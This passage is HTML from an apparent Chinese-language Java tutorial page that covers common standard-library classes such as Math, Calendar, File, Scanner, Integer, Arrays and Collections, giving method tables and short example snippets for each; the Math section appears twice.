&quot;</span> + map.size()); <span class="comment">// 3</span></span><br><span class="line">map.remove(<span class="string">&quot;Banana&quot;</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;移除后映射: &quot;</span> + map); <span class="comment">// &#123;Apple=1, Orange=3&#125;</span></span><br><span class="line">System.out.println(<span class="string">&quot;是否包含Orange键: &quot;</span> + map.containsKey(<span class="string">&quot;Orange&quot;</span>)); <span class="comment">// true</span></span><br></pre></td></tr></table></figure><h2 id="5-Math-类"><a href="#5-Math-类" class="headerlink" title="5. Math 类"></a>5. <code>Math</code> 类</h2><p>提供基本的数学函数。</p><h3 id="常用方法-4"><a href="#常用方法-4" class="headerlink" title="常用方法"></a>常用方法</h3><div class="table-container"><table><thead><tr><th>方法名</th><th>描述</th><th>参数</th><th>返回值</th></tr></thead><tbody><tr><td><code>abs(double a)</code></td><td>返回参数的绝对值</td><td>要计算绝对值的数</td><td><code>double</code></td></tr><tr><td><code>sqrt(double a)</code></td><td>返回参数的平方根</td><td>要计算平方根的数</td><td><code>double</code></td></tr><tr><td><code>pow(double a, double b)</code></td><td>返回a的b次幂</td><td>底数、指数</td><td><code>double</code></td></tr><tr><td><code>max(double a, double b)</code></td><td>返回两个数中的较大值</td><td>两个数</td><td><code>double</code></td></tr><tr><td><code>min(double a, double b)</code></td><td>返回两个数中的较小值</td><td>两个数</td><td><code>double</code></td></tr><tr><td><code>round(double a)</code></td><td>返回最接近参数的整数</td><td>要四舍五入的数</td><td><code>long</code></td></tr><tr><td><code>random()</code></td><td>返回一个介于0.0（包括）和1.0（不包括）之间的随机数</td><td>无</td><td><code>double</code></td></tr><tr><td><code>sin(double a)</code></td><td>返回参数的正弦值</td><td>角度（弧度）</td><td><code>double</code></td></tr><tr><td><code>cos(double a)</code></td><td>返回参数的余弦值</td><td>角度（弧度）</td><td><code>double</code></td></tr><tr><td><code>tan(double a)</code></td><td>返回参数的正切值</td><td>角度（弧度）</td><td><code>double</code></td></tr></tbody></table></div><h3 id="示例代码-4"><a href="#示例代码-4" class="headerlink" title="示例代码"></a>示例代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(<span class="string">&quot;绝对值: &quot;</span> + Math.abs(-<span class="number">5.5</span>)); <span class="comment">// 5.5</span></span><br><span class="line">System.out.println(<span class="string">&quot;平方根: &quot;</span> + Math.sqrt(<span class="number">25</span>)); <span class="comment">// 5.0</span></span><br><span class="line">System.out.println(<span class="string">&quot;3的4次幂: &quot;</span> + Math.pow(<span class="number">3</span>, <span class="number">4</span>)); <span class="comment">// 81.0</span></span><br><span class="line">System.out.println(<span class="string">&quot;最大值: &quot;</span> + Math.max(<span class="number">10</span>, <span class="number">20</span>)); <span class="comment">// 20</span></span><br><span class="line">System.out.println(<span class="string">&quot;随机数: &quot;</span> + Math.random()); <span class="comment">// 例如: 0.64523</span></span><br></pre></td></tr></table></figure><h2 id="6-Date-和-Calendar-类"><a href="#6-Date-和-Calendar-类" class="headerlink" title="6. Date 和 Calendar 类"></a>6. <code>Date</code> 和 <code>Calendar</code> 类</h2><p>用于处理日期和时间。</p><h3 id="Date-类常用方法"><a href="#Date-类常用方法" class="headerlink" title="Date 类常用方法"></a><code>Date</code> 类常用方法</h3><div class="table-container"><table><thead><tr><th>方法名</th><th>描述</th><th>参数</th><th>返回值</th></tr></thead><tbody><tr><td><code>getTime()</code></td><td>返回自1970年1月1日00:00:00 GMT以来的毫秒数</td><td>无</td><td><code>long</code></td></tr><tr><td><code>toString()</code></td><td>返回日期时间的字符串表示</td><td>无</td><td><code>String</code></td></tr></tbody></table></div><h3 id="Calendar-类常用方法"><a href="#Calendar-类常用方法" class="headerlink" title="Calendar 类常用方法"></a><code>Calendar</code> 类常用方法</h3><div class="table-container"><table><thead><tr><th>方法名</th><th>描述</th><th>参数</th><th>返回值</th></tr></thead><tbody><tr><td><code>getInstance()</code></td><td>获取默认时区和语言环境的<code>Calendar</code>对象</td><td>无</td><td><code>Calendar</code></td></tr><tr><td><code>get(int field)</code></td><td>获取指定日历字段的值</td><td>日历字段（如<code>YEAR</code>、<code>MONTH</code>等）</td><td><code>int</code></td></tr><tr><td><code>set(int field, int value)</code></td><td>设置指定日历字段的值</td><td>日历字段、新值</td><td><code>void</code></td></tr><tr><td><code>add(int field, int amount)</code></td><td>给指定日历字段添加或减去指定的时间量</td><td>日历字段、时间量</td><td><code>void</code></td></tr><tr><td><code>getTime()</code></td><td>将<code>Calendar</code>转换为<code>Date</code>对象</td><td>无</td><td><code>Date</code></td></tr></tbody></table></div><h3 id="示例代码-5"><a href="#示例代码-5" class="headerlink" title="示例代码"></a>示例代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Date</span> <span class="variable">date</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line">System.out.println(<span class="string">&quot;当前日期时间: &quot;</span> + date.toString()); <span class="comment">// Fri Jul 01 10:30:45 CST 2022</span></span><br><span class="line"><span class="type">long</span> <span class="variable">millis</span> <span class="operator">=</span> date.getTime();</span><br><span class="line">System.out.println(<span class="string">&quot;自1970年1月1日以来的毫秒数: &quot;</span> + millis);</span><br><span class="line"></span><br><span class="line"><span class="type">Calendar</span> <span class="variable">calendar</span> <span class="operator">=</span> Calendar.getInstance();</span><br><span class="line">System.out.println(<span class="string">&quot;当前年份: &quot;</span> + calendar.get(Calendar.YEAR)); <span class="comment">// 2022</span></span><br><span class="line">calendar.add(Calendar.DAY_OF_MONTH, <span class="number">5</span>); <span class="comment">// 日期加5天</span></span><br><span class="line"><span class="type">Date</span> <span class="variable">newDate</span> <span class="operator">=</span> calendar.getTime();</span><br><span class="line">System.out.println(<span class="string">&quot;新日期: &quot;</span> + newDate.toString());</span><br></pre></td></tr></table></figure><h2 id="7-File-类"><a href="#7-File-类" class="headerlink" title="7. File 类"></a>7. <code>File</code> 类</h2><p>用于操作文件和目录。</p><h3 id="常用方法-5"><a href="#常用方法-5" class="headerlink" title="常用方法"></a>常用方法</h3><div class="table-container"><table><thead><tr><th>方法名</th><th>描述</th><th>参数</th><th>返回值</th></tr></thead><tbody><tr><td><code>exists()</code></td><td>检查文件或目录是否存在</td><td>无</td><td><code>boolean</code></td></tr><tr><td><code>isFile()</code></td><td>检查是否为文件</td><td>无</td><td><code>boolean</code></td></tr><tr><td><code>isDirectory()</code></td><td>检查是否为目录</td><td>无</td><td><code>boolean</code></td></tr><tr><td><code>length()</code></td><td>获取文件的大小（字节）</td><td>无</td><td><code>long</code></td></tr><tr><td><code>getName()</code></td><td>获取文件或目录的名称</td><td>无</td><td><code>String</code></td></tr><tr><td><code>getParent()</code></td><td>获取父目录的路径名</td><td>无</td><td><code>String</code></td></tr><tr><td><code>getPath()</code></td><td>获取文件或目录的路径名</td><td>无</td><td><code>String</code></td></tr><tr><td><code>getAbsolutePath()</code></td><td>获取绝对路径名</td><td>无</td><td><code>String</code></td></tr><tr><td><code>list()</code></td><td>返回目录中的文件和目录名数组</td><td>无</td><td><code>String[]</code></td></tr><tr><td><code>listFiles()</code></td><td>返回目录中的文件和目录对象数组</td><td>无</td><td><code>File[]</code></td></tr><tr><td><code>mkdir()</code></td><td>创建目录</td><td>无</td><td><code>boolean</code></td></tr><tr><td><code>mkdirs()</code></td><td>创建多层目录</td><td>无</td><td><code>boolean</code></td></tr><tr><td><code>delete()</code></td><td>删除文件或目录</td><td>无</td><td><code>boolean</code></td></tr><tr><td><code>renameTo(File dest)</code></td><td>重命名文件或目录</td><td>新的文件或目录对象</td><td><code>boolean</code></td></tr></tbody></table></div><h3 id="示例代码-6"><a href="#示例代码-6" class="headerlink" title="示例代码"></a>示例代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;example.txt&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (!file.exists()) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        file.createNewFile();</span><br><span class="line">        System.out.println(<span class="string">&quot;文件创建成功&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(<span class="string">&quot;文件大小: &quot;</span> + file.length() + <span class="string">&quot;字节&quot;</span>);</span><br><span class="line"><span class="type">File</span> <span class="variable">dir</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;testDir&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (!dir.exists()) &#123;</span><br><span class="line">    dir.mkdirs();</span><br><span class="line">    System.out.println(<span class="string">&quot;目录创建成功&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">File[] files = dir.listFiles();</span><br><span class="line"><span class="keyword">if</span> (files != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (File f : files) &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;目录中的文件: &quot;</span> + f.getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="8-Scanner-类"><a href="#8-Scanner-类" class="headerlink" title="8. Scanner 类"></a>8. <code>Scanner</code> 类</h2><p>用于获取用户输入。</p><h3 id="常用方法-6"><a href="#常用方法-6" class="headerlink" title="常用方法"></a>常用方法</h3><div class="table-container"><table><thead><tr><th>方法名</th><th>描述</th><th>参数</th><th>返回值</th></tr></thead><tbody><tr><td><code>next()</code></td><td>获取下一个输入的字符串（以空白符分隔）</td><td>无</td><td><code>String</code></td></tr><tr><td><code>nextLine()</code></td><td>获取整行输入</td><td>无</td><td><code>String</code></td></tr><tr><td><code>nextInt()</code></td><td>获取下一个输入的整数</td><td>无</td><td><code>int</code></td></tr><tr><td><code>nextDouble()</code></td><td>获取下一个输入的双精度浮点数</td><td>无</td><td><code>double</code></td></tr><tr><td><code>hasNext()</code></td><td>检查是否有更多输入可用</td><td>无</td><td><code>boolean</code></td></tr><tr><td><code>close()</code></td><td>关闭扫描器</td><td>无</td><td><code>void</code></td></tr></tbody></table></div><h3 id="示例代码-7"><a href="#示例代码-7" class="headerlink" title="示例代码"></a>示例代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">System.out.print(<span class="string">&quot;请输入您的名字: &quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> scanner.nextLine();</span><br><span class="line">System.out.print(<span class="string">&quot;请输入您的年龄: &quot;</span>);</span><br><span class="line"><span class="type">int</span> <span class="variable">age</span> <span class="operator">=</span> scanner.nextInt();</span><br><span class="line">scanner.close();</span><br><span class="line">System.out.println(<span class="string">&quot;名字: &quot;</span> + name + <span class="string">&quot;, 年龄: &quot;</span> + age);</span><br></pre></td></tr></table></figure><h2 id="9-PrintStream-类"><a href="#9-PrintStream-类" class="headerlink" title="9. PrintStream 类"></a>9. <code>PrintStream</code> 类</h2><p>用于输出数据，<code>System.out</code> 是其对象。</p><h3 id="常用方法-7"><a href="#常用方法-7" class="headerlink" title="常用方法"></a>常用方法</h3><div class="table-container"><table><thead><tr><th>方法名</th><th>描述</th><th>参数</th><th>返回值</th></tr></thead><tbody><tr><td><code>print(String s)</code></td><td>输出字符串，不换行</td><td>要输出的字符串</td><td><code>void</code></td></tr><tr><td><code>println(String s)</code></td><td>输出字符串，并换行</td><td>要输出的字符串</td><td><code>void</code></td></tr><tr><td><code>printf(String format, Object... args)</code></td><td>格式化输出</td><td>格式字符串、参数列表</td><td><code>PrintStream</code></td></tr></tbody></table></div><h3 id="示例代码-8"><a href="#示例代码-8" class="headerlink" title="示例代码"></a>示例代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">PrintStream</span> <span class="variable">ps</span> <span class="operator">=</span> System.out;</span><br><span class="line">ps.println(<span class="string">&quot;Hello, World!&quot;</span>);</span><br><span class="line">ps.printf(<span class="string">&quot;圆周率: %.2f%n&quot;</span>, Math.PI); <span class="comment">// 圆周率: 3.14</span></span><br></pre></td></tr></table></figure><h2 id="10-Math-类"><a href="#10-Math-类" class="headerlink" title="10. Math 类"></a>10. <code>Math</code> 类</h2><p>提供基本的数学函数。</p><h3 id="常用方法-8"><a href="#常用方法-8" class="headerlink" title="常用方法"></a>常用方法</h3><div class="table-container"><table><thead><tr><th>方法名</th><th>描述</th><th>参数</th><th>返回值</th></tr></thead><tbody><tr><td><code>abs(double a)</code></td><td>返回参数的绝对值</td><td>要计算绝对值的数</td><td><code>double</code></td></tr><tr><td><code>sqrt(double a)</code></td><td>返回参数的平方根</td><td>要计算平方根的数</td><td><code>double</code></td></tr><tr><td><code>pow(double a, double b)</code></td><td>返回a的b次幂</td><td>底数、指数</td><td><code>double</code></td></tr><tr><td><code>max(double a, double b)</code></td><td>返回两个数中的较大值</td><td>两个数</td><td><code>double</code></td></tr><tr><td><code>min(double a, double b)</code></td><td>返回两个数中的较小值</td><td>两个数</td><td><code>double</code></td></tr><tr><td><code>round(double a)</code></td><td>返回最接近参数的整数</td><td>要四舍五入的数</td><td><code>long</code></td></tr><tr><td><code>random()</code></td><td>返回一个介于0.0（包括）和1.0（不包括）之间的随机数</td><td>无</td><td><code>double</code></td></tr><tr><td><code>sin(double a)</code></td><td>返回参数的正弦值</td><td>角度（弧度）</td><td><code>double</code></td></tr><tr><td><code>cos(double a)</code></td><td>返回参数的余弦值</td><td>角度（弧度）</td><td><code>double</code></td></tr><tr><td><code>tan(double a)</code></td><td>返回参数的正切值</td><td>角度（弧度）</td><td><code>double</code></td></tr></tbody></table></div><h3 id="示例代码-9"><a href="#示例代码-9" class="headerlink" title="示例代码"></a>示例代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(<span class="string">&quot;绝对值: &quot;</span> + Math.abs(-<span class="number">5.5</span>)); <span class="comment">// 5.5</span></span><br><span class="line">System.out.println(<span class="string">&quot;平方根: &quot;</span> + Math.sqrt(<span class="number">25</span>)); <span class="comment">// 5.0</span></span><br><span class="line">System.out.println(<span class="string">&quot;3的4次幂: &quot;</span> + Math.pow(<span class="number">3</span>, <span class="number">4</span>)); <span class="comment">// 81.0</span></span><br><span class="line">System.out.println(<span class="string">&quot;最大值: &quot;</span> + Math.max(<span class="number">10</span>, <span class="number">20</span>)); <span class="comment">// 20</span></span><br><span class="line">System.out.println(<span class="string">&quot;随机数: &quot;</span> + Math.random()); <span class="comment">// 例如: 0.64523</span></span><br></pre></td></tr></table></figure><h2 id="11-System-类"><a href="#11-System-类" class="headerlink" title="11. System 类"></a>11. <code>System</code> 类</h2><p>提供系统相关的属性和方法。</p><h3 id="常用方法-9"><a href="#常用方法-9" class="headerlink" title="常用方法"></a>常用方法</h3><div class="table-container"><table><thead><tr><th>方法名</th><th>描述</th><th>参数</th><th>返回值</th></tr></thead><tbody><tr><td><code>currentTimeMillis()</code></td><td>返回当前时间的毫秒数</td><td>无</td><td><code>long</code></td></tr><tr><td><code>nanoTime()</code></td><td>返回当前时间的纳秒数</td><td>无</td><td><code>long</code></td></tr><tr><td><code>arraycopy(Object src, int srcPos, Object dest, int destPos, int length)</code></td><td>数组复制</td><td>源数组、源起始位置、目标数组、目标起始位置、复制长度</td><td><code>void</code></td></tr><tr><td><code>getProperty(String key)</code></td><td>获取系统属性值</td><td>属性键</td><td><code>String</code></td></tr></tbody></table></div><h3 id="示例代码-10"><a href="#示例代码-10" class="headerlink" title="示例代码"></a>示例代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="variable">startTime</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line"><span class="comment">// 执行某些操作</span></span><br><span class="line"><span class="type">long</span> <span class="variable">endTime</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line">System.out.println(<span class="string">&quot;执行时间: &quot;</span> + (endTime - startTime) + <span class="string">&quot;ms&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">osName</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;操作系统名称: &quot;</span> + osName);</span><br></pre></td></tr></table></figure><h2 id="12-Integer-类"><a href="#12-Integer-类" class="headerlink" title="12. Integer 类"></a>12. <code>Integer</code> 类</h2><p><code>int</code> 基本类型的包装类。</p><h3 id="常用方法-10"><a href="#常用方法-10" class="headerlink" title="常用方法"></a>常用方法</h3><div class="table-container"><table><thead><tr><th>方法名</th><th>描述</th><th>参数</th><th>返回值</th></tr></thead><tbody><tr><td><code>parseInt(String s)</code></td><td>将字符串转换为整数</td><td>要转换的字符串</td><td><code>int</code></td></tr><tr><td><code>toString(int i)</code></td><td>将整数转换为字符串</td><td>要转换的整数</td><td><code>String</code></td></tr><tr><td><code>valueOf(String s)</code></td><td>返回表示指定字符串的<code>Integer</code>对象</td><td>要转换的字符串</td><td><code>Integer</code></td></tr><tr><td><code>max(int a, int b)</code></td><td>返回两个整数中的较大值</td><td>两个整数</td><td><code>int</code></td></tr><tr><td><code>min(int a, int b)</code></td><td>返回两个整数中的较小值</td><td>两个整数</td><td><code>int</code></td></tr><tr><td><code>bitCount(int i)</code></td><td>返回整数二进制表示中1的位数</td><td>整数</td><td><code>int</code></td></tr><tr><td><code>compare(int x, int y)</code></td><td>比较两个整数的大小</td><td>两个整数</td><td><code>int</code></td></tr></tbody></table></div><h3 id="示例代码-11"><a href="#示例代码-11" class="headerlink" title="示例代码"></a>示例代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">numStr</span> <span class="operator">=</span> <span class="string">&quot;123&quot;</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> Integer.parseInt(numStr);</span><br><span class="line">System.out.println(<span class="string">&quot;字符串转换为整数: &quot;</span> + num); <span class="comment">// 123</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="variable">maxNum</span> <span class="operator">=</span> Integer.max(<span class="number">10</span>, <span class="number">20</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;最大值: &quot;</span> + maxNum); <span class="comment">// 20</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="variable">bitCount</span> <span class="operator">=</span> Integer.bitCount(<span class="number">7</span>); <span class="comment">// 二进制111中有3个1</span></span><br><span class="line">System.out.println(<span class="string">&quot;二进制中1的位数: &quot;</span> + bitCount); <span class="comment">// 3</span></span><br></pre></td></tr></table></figure><h2 id="13-Double-类"><a href="#13-Double-类" class="headerlink" title="13. Double 类"></a>13. <code>Double</code> 类</h2><p><code>double</code> 基本类型的包装类。</p><h3 id="常用方法-11"><a href="#常用方法-11" class="headerlink" title="常用方法"></a>常用方法</h3><div class="table-container"><table><thead><tr><th>方法名</th><th>描述</th><th>参数</th><th>返回值</th></tr></thead><tbody><tr><td><code>parseDouble(String s)</code></td><td>将字符串转换为双精度浮点数</td><td>要转换的字符串</td><td><code>double</code></td></tr><tr><td><code>toString(double d)</code></td><td>将双精度浮点数转换为字符串</td><td>要转换的浮点数</td><td><code>String</code></td></tr><tr><td><code>isNaN(double v)</code></td><td>检查是否为<code>NaN</code>（非数字）</td><td>浮点数值</td><td><code>boolean</code></td></tr><tr><td><code>isInfinite(double v)</code></td><td>检查是否为无穷大</td><td>浮点数值</td><td><code>boolean</code></td></tr><tr><td><code>compare(double d1, double d2)</code></td><td>比较两个双精度浮点数的大小</td><td>两个浮点数</td><td><code>int</code></td></tr></tbody></table></div><h3 id="示例代码-12"><a href="#示例代码-12" class="headerlink" title="示例代码"></a>示例代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">doubleStr</span> <span class="operator">=</span> <span class="string">&quot;3.14&quot;</span>;</span><br><span class="line"><span class="type">double</span> <span class="variable">value</span> <span class="operator">=</span> Double.parseDouble(doubleStr);</span><br><span class="line">System.out.println(<span class="string">&quot;字符串转换为浮点数: &quot;</span> + value); <span class="comment">// 3.14</span></span><br><span class="line"></span><br><span class="line"><span class="type">boolean</span> <span class="variable">isNan</span> <span class="operator">=</span> Double.isNaN(<span class="number">0.0</span> / <span class="number">0.0</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;是否为NaN: &quot;</span> + isNan); <span class="comment">// true</span></span><br></pre></td></tr></table></figure><h2 id="14-Character-类"><a href="#14-Character-类" class="headerlink" title="14. Character 类"></a>14. <code>Character</code> 类</h2><p><code>char</code> 基本类型的包装类。</p><h3 id="常用方法-12"><a href="#常用方法-12" class="headerlink" title="常用方法"></a>常用方法</h3><div class="table-container"><table><thead><tr><th>方法名</th><th>描述</th><th>参数</th><th>返回值</th></tr></thead><tbody><tr><td><code>isDigit(char c)</code></td><td>判断字符是否为数字</td><td>要判断的字符</td><td><code>boolean</code></td></tr><tr><td><code>isLetter(char c)</code></td><td>判断字符是否为字母</td><td>要判断的字符</td><td><code>boolean</code></td></tr><tr><td><code>isUpperCase(char c)</code></td><td>判断字符是否为大写字母</td><td>要判断的字符</td><td><code>boolean</code></td></tr><tr><td><code>isLowerCase(char c)</code></td><td>判断字符是否为小写字母</td><td>要判断的字符</td><td><code>boolean</code></td></tr><tr><td><code>toUpperCase(char c)</code></td><td>将字符转换为大写</td><td>要转换的字符</td><td><code>char</code></td></tr><tr><td><code>toLowerCase(char c)</code></td><td>将字符转换为小写</td><td>要转换的字符</td><td><code>char</code></td></tr><tr><td><code>toString(char c)</code></td><td>将字符转换为字符串</td><td>要转换的字符</td><td><code>String</code></td></tr></tbody></table></div><h3 id="示例代码-13"><a href="#示例代码-13" class="headerlink" title="示例代码"></a>示例代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> <span class="variable">ch</span> <span class="operator">=</span> <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">System.out.println(<span class="string">&quot;是否为字母: &quot;</span> + Character.isLetter(ch)); <span class="comment">// true</span></span><br><span class="line">System.out.println(<span class="string">&quot;是否为大写: &quot;</span> + Character.isUpperCase(ch)); <span class="comment">// true</span></span><br><span class="line">System.out.println(<span class="string">&quot;转换为小写: &quot;</span> + Character.toLowerCase(ch)); <span class="comment">// a</span></span><br></pre></td></tr></table></figure><h2 id="15-Arrays-类"><a href="#15-Arrays-类" class="headerlink" title="15. Arrays 类"></a>15. <code>Arrays</code> 类</h2><p>提供操作数组的静态方法。</p><h3 id="常用方法-13"><a href="#常用方法-13" class="headerlink" title="常用方法"></a>常用方法</h3><div class="table-container"><table><thead><tr><th>方法名</th><th>描述</th><th>参数</th><th>返回值</th></tr></thead><tbody><tr><td><code>toString(Object[] array)</code></td><td>返回数组内容的字符串表示</td><td>数组</td><td><code>String</code></td></tr><tr><td><code>sort(T[] array)</code></td><td>对数组进行升序排序</td><td>数组</td><td><code>void</code></td></tr><tr><td><code>binarySearch(T[] array, T key)</code></td><td>在有序数组中通过二分法查找指定元素</td><td>数组、要查找的元素</td><td><code>int</code></td></tr><tr><td><code>copyOf(T[] array, int newLength)</code></td><td>复制数组，新数组长度可能不同</td><td>数组、新长度</td><td><code>T[]</code></td></tr><tr><td><code>fill(Object[] array, Object val)</code></td><td>用指定值填充数组</td><td>数组、填充值</td><td><code>void</code></td></tr><tr><td><code>equals(T[] a, T[] b)</code></td><td>比较两个数组是否相等</td><td>两个数组</td><td><code>boolean</code></td></tr></tbody></table></div><h3 id="示例代码-14"><a href="#示例代码-14" class="headerlink" title="示例代码"></a>示例代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span>[] arr = &#123;<span class="number">3</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">9</span>&#125;;</span><br><span class="line">Arrays.sort(arr);</span><br><span class="line">System.out.println(<span class="string">&quot;排序后的数组: &quot;</span> + Arrays.toString(arr)); <span class="comment">// [1, 1, 3, 4, 5, 9]</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> Arrays.binarySearch(arr, <span class="number">4</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;元素4的位置: &quot;</span> + index); <span class="comment">// 3</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span>[] newArr = Arrays.copyOf(arr, <span class="number">4</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;复制后的数组: &quot;</span> + Arrays.toString(newArr)); <span class="comment">// [1, 1, 3, 4]</span></span><br></pre></td></tr></table></figure><h2 id="16-Collections-类"><a href="#16-Collections-类" class="headerlink" title="16. Collections 类"></a>16. <code>Collections</code> 类</h2><p>提供操作集合的静态方法。</p><h3 id="常用方法-14"><a href="#常用方法-14" class="headerlink" title="常用方法"></a>常用方法</h3><div class="table-container"><table><thead><tr><th>方法名</th><th>描述</th><th>参数</th><th>返回值</th></tr></thead><tbody><tr><td><code>sort(List&lt;T&gt; list)</code></td><td>对列表进行升序排序</td><td>列表</td><td><code>void</code></td></tr><tr><td><code>reverse(List&lt;T&gt; list)</code></td><td>反转列表中元素的顺序</td><td>列表</td><td><code>void</code></td></tr><tr><td><code>shuffle(List&lt;T&gt; list)</code></td><td>随机打乱列表中元素的顺序</td><td>列表</td><td><code>void</code></td></tr><tr><td><code>max(Collection&lt;? extends T&gt; coll)</code></td><td>返回集合中的最大元素</td><td>集合</td><td><code>T</code></td></tr><tr><td><code>min(Collection&lt;? extends T&gt; coll)</code></td><td>返回集合中的最小元素</td><td>集合</td><td><code>T</code></td></tr><tr><td><code>frequency(Collection&lt;?&gt; coll, Object o)</code></td><td>返回集合中指定元素的出现次数</td><td>集合、元素</td><td><code>int</code></td></tr><tr><td><code>replaceAll(List&lt;T&gt; list, T oldVal, T newVal)</code></td><td>将列表中的所有旧值替换为新值</td><td>列表、旧值、新值</td><td><code>void</code></td></tr></tbody></table></div><h3 id="示例代码-15"><a href="#示例代码-15" class="headerlink" title="示例代码"></a>示例代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">ArrayList&lt;Integer&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">list.add(<span class="number">3</span>);</span><br><span class="line">list.add(<span class="number">1</span>);</span><br><span class="line">list.add(<span class="number">4</span>);</span><br><span class="line">list.add(<span class="number">1</span>);</span><br><span class="line">list.add(<span class="number">5</span>);</span><br><span class="line">list.add(<span class="number">9</span>);</span><br><span class="line"></span><br><span class="line">Collections.sort(list);</span><br><span class="line">System.out.println(<span class="string">&quot;排序后的列表: &quot;</span> + list); <span class="comment">// [1, 1, 3, 4, 5, 9]</span></span><br><span class="line"></span><br><span class="line">Collections.reverse(list);</span><br><span class="line">System.out.println(<span class="string">&quot;反转后的列表: &quot;</span> + list); <span 